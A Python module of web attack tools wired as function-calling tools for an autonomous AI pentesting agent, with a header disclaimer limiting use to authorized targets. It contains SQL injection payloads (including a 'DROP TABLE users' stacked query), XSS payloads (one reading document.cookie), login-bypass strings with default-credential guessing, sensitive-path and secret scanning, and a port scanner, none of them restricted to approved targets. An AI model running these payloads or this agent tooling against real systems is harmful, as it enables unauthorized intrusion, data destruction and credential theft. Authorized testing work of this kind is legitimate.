"""
Security Testing Tools.

These are the "MCP tools" from the paper, translated into lightweight
Python functions callable by the autonomous agent loop. Each tool returns
a structured dict the agent can reason about.

IMPORTANT — Ethical use only. Always test against systems you own or
have explicit written permission to test. Never target live production
systems without authorization.
"""
import socket
import time
import re
import subprocess
import urllib.parse
from typing import Optional
import httpx

# ── Default timeouts ──────────────────────────────────────────────────────── #
HTTP_TIMEOUT = 8.0
DEFAULT_UA = "RedTeamSwarm/0.1 (authorized-pentest)"


def _client() -> httpx.Client:
    return httpx.Client(
        timeout=HTTP_TIMEOUT,
        follow_redirects=True,
        verify=False,       # self-signed certs common on test targets
        headers={"User-Agent": DEFAULT_UA},
    )


# ═══════════════════════════════════════════════════════════════════════════ #
#  Tool 1: HTTP Request                                                       #
# ═══════════════════════════════════════════════════════════════════════════ #

def http_request(
    url: str,
    method: str = "GET",
    headers: Optional[dict] = None,
    params: Optional[dict] = None,
    body: Optional[str] = None,
) -> dict:
    """Make an HTTP request and return status, headers, body snippet."""
    try:
        with _client() as c:
            resp = c.request(
                method.upper(),
                url,
                headers=headers or {},
                params=params or {},
                content=body.encode() if body else None,
            )
        return {
            "ok": True,
            "status": resp.status_code,
            "headers": dict(resp.headers),
            "body": resp.text[:2000],
            "redirect_url": str(resp.url),
        }
    except Exception as e:
        return {"ok": False, "error": str(e)}


# ═══════════════════════════════════════════════════════════════════════════ #
#  Tool 2: SQL Injection probe                                                #
# ═══════════════════════════════════════════════════════════════════════════ #

SQL_PAYLOADS = [
    ("error-based",   "' OR '1'='1"),
    ("error-based",   "' OR 1=1--"),
    ("error-based",   '" OR "1"="1'),
    ("boolean",       "1 AND 1=1"),
    ("boolean",       "1 AND 1=2"),
    ("time-based",    "'; WAITFOR DELAY '0:0:3'--"),
    ("time-based",    "'; SELECT SLEEP(3)--"),
    ("union",         "' UNION SELECT NULL--"),
    ("stacked",       "'; DROP TABLE users--"),
]

SQL_ERROR_SIGNATURES = [
    "sql syntax", "mysql_fetch", "ora-", "sqlite_", "pg_query",
    "unclosed quotation", "syntax error", "invalid query",
    "you have an error in your sql", "warning: mysql",
    "odbc driver", "sqlstate", "jdbc",
]


def check_sql_injection(url: str, parameter: str, method: str = "GET") -> dict:
    """
    Test a URL parameter for SQL injection. Returns findings dict with
    evidence if vulnerable.
    """
    results = []
    base = http_request(url, method)
    baseline_body = base.get("body", "")
    baseline_status = base.get("status", 0)

    for style, payload in SQL_PAYLOADS:
        encoded = urllib.parse.quote(payload)

        if method.upper() == "GET":
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{parameter}={encoded}"
            resp = http_request(test_url, "GET")
        else:
            resp = http_request(url, "POST", body=f"{parameter}={encoded}")

        body = resp.get("body", "").lower()
        status = resp.get("status", 0)

        # Detect SQL errors
        error_hit = any(sig in body for sig in SQL_ERROR_SIGNATURES)

        # Boolean-based: two payloads with different truth values → different responses
        different_length = abs(len(body) - len(baseline_body)) > 50

        # Time-based: approximate (not precise in this lightweight version)
        if style == "time-based":
            t0 = time.time()
            http_request(test_url if method == "GET" else url,
                         method,
                         body=f"{parameter}={encoded}" if method == "POST" else None)
            elapsed = time.time() - t0
            if elapsed > 2.5:
                results.append({
                    "style": "time-based",
                    "payload": payload,
                    "evidence": f"Response took {elapsed:.1f}s (potential time-based SQLi)",
                    "confidence": "MEDIUM",
                })

        if error_hit:
            results.append({
                "style": style,
                "payload": payload,
                "evidence": f"SQL error signature in response body",
                "body_snippet": body[:300],
                "confidence": "HIGH",
            })
        elif different_length and style == "boolean":
            results.append({
                "style": style,
                "payload": payload,
                "evidence": f"Boolean response length differs by {abs(len(body)-len(baseline_body))} chars",
                "confidence": "MEDIUM",
            })

    return {
        "url": url,
        "parameter": parameter,
        "vulnerable": len(results) > 0,
        "findings": results,
    }


# ═══════════════════════════════════════════════════════════════════════════ #
#  Tool 3: XSS probe                                                          #
# ═══════════════════════════════════════════════════════════════════════════ #

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '<body onload=alert(1)>',
    '"><img src=x onerror=alert(document.cookie)>',
]


def check_xss(url: str, parameter: str, method: str = "GET") -> dict:
    """Test a parameter for reflected XSS."""
    results = []
    for payload in XSS_PAYLOADS:
        encoded = urllib.parse.quote(payload)

        if method.upper() == "GET":
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{parameter}={encoded}"
            resp = http_request(test_url, "GET")
        else:
            resp = http_request(url, "POST", body=f"{parameter}={encoded}")

        body = resp.get("body", "")
        # Check if payload is reflected unencoded
        if payload in body or payload.lower() in body.lower():
            results.append({
                "payload": payload,
                "evidence": "Payload reflected verbatim in response",
                "confidence": "HIGH",
            })
        # Partially reflected (tag attributes injected)
        elif "<script" in body.lower() and "alert" in body.lower():
            results.append({
                "payload": payload,
                "evidence": "Partial script reflection detected",
                "confidence": "MEDIUM",
            })

    return {
        "url": url,
        "parameter": parameter,
        "vulnerable": len(results) > 0,
        "findings": results,
    }


# ═══════════════════════════════════════════════════════════════════════════ #
#  Tool 4: Directory / path scan                                              #
# ═══════════════════════════════════════════════════════════════════════════ #

COMMON_PATHS = [
    "/admin", "/admin/", "/administrator", "/login", "/wp-admin",
    "/.env", "/.git/HEAD", "/config.php", "/config.yml", "/config.json",
    "/backup", "/backup.zip", "/db.sql", "/dump.sql",
    "/api/v1", "/api/v2", "/api/docs", "/swagger", "/swagger-ui",
    "/actuator", "/actuator/health", "/actuator/env",
    "/debug", "/test", "/phpinfo.php", "/info.php",
    "/robots.txt", "/sitemap.xml", "/.htaccess",
    "/upload", "/uploads", "/files", "/static",
    "/users", "/user", "/account", "/accounts",
    "/panel", "/dashboard", "/management",
]

SENSITIVE_PATTERNS = [
    r"password\s*[:=]\s*\S+",
    r"secret\s*[:=]\s*\S+",
    r"api[_-]?key\s*[:=]\s*\S+",
    r"token\s*[:=]\s*\S+",
    r"AWS_",
    r"-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----",
    r"DB_PASS",
]


def scan_directories(base_url: str, extra_paths: Optional[list] = None) -> dict:
    """Scan for exposed sensitive paths."""
    paths = COMMON_PATHS + (extra_paths or [])
    base_url = base_url.rstrip("/")
    discovered = []

    for path in paths:
        url = base_url + path
        resp = http_request(url)
        status = resp.get("status", 0)
        body = resp.get("body", "")

        if status in (200, 201, 301, 302) and status != 404:
            sensitive = []
            for pat in SENSITIVE_PATTERNS:
                if re.search(pat, body, re.IGNORECASE):
                    sensitive.append(pat)

            discovered.append({
                "path": path,
                "status": status,
                "body_length": len(body),
                "sensitive_patterns": sensitive,
                "severity": "CRITICAL" if sensitive else ("HIGH" if status == 200 else "LOW"),
                "snippet": body[:200],
            })

    return {
        "base_url": base_url,
        "paths_tested": len(paths),
        "discovered": discovered,
    }


# ═══════════════════════════════════════════════════════════════════════════ #
#  Tool 5: Authentication bypass                                              #
# ═══════════════════════════════════════════════════════════════════════════ #

def check_auth_bypass(login_url: str) -> dict:
    """
    Try common authentication bypass techniques against a login endpoint.
    """
    attempts = []
    bypass_creds = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", ""),
        ("root", "root"),
        ("administrator", "administrator"),
        ("test", "test"),
        ("guest", "guest"),
    ]
    sqli_bypasses = [
        ("' OR '1'='1'--", "anything"),
        ("admin'--", "anything"),
        ("' OR 1=1--", ""),
    ]

    for user, pwd in bypass_creds:
        resp = http_request(login_url, "POST",
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            body=f"username={user}&password={pwd}")
        body = resp.get("body", "").lower()
        status = resp.get("status", 0)
        redirect = resp.get("redirect_url", "")

        success_indicators = ["welcome", "dashboard", "logout", "profile", "account"]
        fail_indicators = ["invalid", "incorrect", "wrong", "failed", "error"]

        is_success = (
            status in (301, 302)
            or any(s in body for s in success_indicators)
        ) and not any(f in body for f in fail_indicators)

        if is_success:
            attempts.append({
                "type": "default_credentials",
                "username": user,
                "password": pwd,
                "status": status,
                "evidence": "Login appeared successful",
                "confidence": "HIGH",
            })

    for user, pwd in sqli_bypasses:
        encoded_user = urllib.parse.quote(user)
        resp = http_request(login_url, "POST",
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            body=f"username={encoded_user}&password={pwd}")
        body = resp.get("body", "").lower()
        if "dashboard" in body or resp.get("status") in (301, 302):
            attempts.append({
                "type": "sqli_bypass",
                "username": user,
                "password": pwd,
                "evidence": "SQLi bypass may have succeeded",
                "confidence": "MEDIUM",
            })

    return {
        "url": login_url,
        "vulnerable": len(attempts) > 0,
        "findings": attempts,
    }


# ═══════════════════════════════════════════════════════════════════════════ #
#  Tool 6: Security header check                                              #
# ═══════════════════════════════════════════════════════════════════════════ #

EXPECTED_HEADERS = {
    "Strict-Transport-Security": "HSTS missing — MITM attack surface",
    "X-Content-Type-Options":    "MIME sniffing enabled",
    "X-Frame-Options":           "Clickjacking possible",
    "Content-Security-Policy":   "No CSP — XSS easier to exploit",
    "X-XSS-Protection":          "Browser XSS filter not enforced",
    "Referrer-Policy":           "Referrer leakage possible",
    "Permissions-Policy":        "Browser feature policy missing",
}

DANGEROUS_HEADERS = {
    "Server":         "Server version disclosed",
    "X-Powered-By":  "Technology stack disclosed",
    "X-AspNet-Version": "ASP.NET version disclosed",
}


def check_security_headers(url: str) -> dict:
    """Audit HTTP security headers."""
    resp = http_request(url)
    if not resp.get("ok"):
        return {"error": resp.get("error")}

    headers = {k.lower(): v for k, v in resp.get("headers", {}).items()}
    issues = []

    for header, description in EXPECTED_HEADERS.items():
        if header.lower() not in headers:
            issues.append({
                "type": "missing_header",
                "header": header,
                "description": description,
                "severity": "MEDIUM",
            })

    for header, description in DANGEROUS_HEADERS.items():
        if header.lower() in headers:
            issues.append({
                "type": "information_disclosure",
                "header": header,
                "value": headers[header.lower()],
                "description": description,
                "severity": "LOW",
            })

    return {
        "url": url,
        "issues": issues,
        "headers_present": list(headers.keys()),
    }


# ═══════════════════════════════════════════════════════════════════════════ #
#  Tool 7: Port scan (socket-based, no nmap needed)                          #
# ═══════════════════════════════════════════════════════════════════════════ #

COMMON_PORTS = [21, 22, 23, 25, 80, 443, 3000, 3306, 4000, 5000,
                5432, 6379, 8000, 8080, 8443, 8888, 9200, 27017]


def port_scan(host: str, ports: Optional[list] = None) -> dict:
    """Lightweight socket-based port scanner."""
    ports = ports or COMMON_PORTS
    # Strip protocol
    host = re.sub(r"https?://", "", host).split("/")[0].split(":")[0]

    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            result = sock.connect_ex((host, port))
            sock.close()
            if result == 0:
                open_ports.append({
                    "port": port,
                    "service": _guess_service(port),
                    "severity": _port_severity(port),
                })
        except Exception:
            pass

    return {
        "host": host,
        "open_ports": open_ports,
        "scanned_count": len(ports),
    }


def _guess_service(port: int) -> str:
    services = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
                80: "HTTP", 443: "HTTPS", 3306: "MySQL", 5432: "PostgreSQL",
                6379: "Redis", 27017: "MongoDB", 9200: "Elasticsearch"}
    return services.get(port, "unknown")


def _port_severity(port: int) -> str:
    critical = {23, 21}      # Telnet, FTP (plaintext)
    high = {3306, 5432, 6379, 27017, 9200}  # DBs exposed
    if port in critical:
        return "CRITICAL"
    if port in high:
        return "HIGH"
    return "INFO"


# ═══════════════════════════════════════════════════════════════════════════ #
#  Tool registry (used to build Ollama tool schemas)                          #
# ═══════════════════════════════════════════════════════════════════════════ #

TOOL_REGISTRY = {
    "http_request": http_request,
    "check_sql_injection": check_sql_injection,
    "check_xss": check_xss,
    "scan_directories": scan_directories,
    "check_auth_bypass": check_auth_bypass,
    "check_security_headers": check_security_headers,
    "port_scan": port_scan,
}

TOOL_SCHEMAS = [
    {
        "type": "function",
        "function": {
            "name": "http_request",
            "description": "Make an HTTP request to any URL. Use to probe endpoints, check responses, explore the target.",
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Full URL to request"},
                    "method": {"type": "string", "enum": ["GET","POST","PUT","DELETE","OPTIONS","HEAD"], "default": "GET"},
                    "headers": {"type": "object", "description": "Optional HTTP headers"},
                    "params": {"type": "object", "description": "Optional query parameters"},
                    "body": {"type": "string", "description": "Optional request body"},
                },
                "required": ["url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "check_sql_injection",
            "description": "Test a URL parameter for SQL injection vulnerabilities using error-based, boolean, and time-based techniques.",
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string"},
                    "parameter": {"type": "string", "description": "Parameter name to test"},
                    "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
                },
                "required": ["url", "parameter"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "check_xss",
            "description": "Test a URL parameter for reflected XSS vulnerabilities.",
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string"},
                    "parameter": {"type": "string"},
                    "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
                },
                "required": ["url", "parameter"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "scan_directories",
            "description": "Scan for exposed sensitive paths, admin panels, config files, and backups.",
            "parameters": {
                "type": "object",
                "properties": {
                    "base_url": {"type": "string"},
                    "extra_paths": {"type": "array", "items": {"type": "string"}, "description": "Additional paths to check"},
                },
                "required": ["base_url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "check_auth_bypass",
            "description": "Try common authentication bypass techniques against a login endpoint.",
            "parameters": {
                "type": "object",
                "properties": {
                    "login_url": {"type": "string"},
                },
                "required": ["login_url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "check_security_headers",
            "description": "Audit HTTP security headers for missing protections and information disclosure.",
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string"},
                },
                "required": ["url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "port_scan",
            "description": "Scan common ports on a host to find exposed services.",
            "parameters": {
                "type": "object",
                "properties": {
                    "host": {"type": "string", "description": "Hostname or IP (no protocol)"},
                    "ports": {"type": "array", "items": {"type": "integer"}, "description": "Optional list of ports to scan"},
                },
                "required": ["host"],
            },
        },
    },
]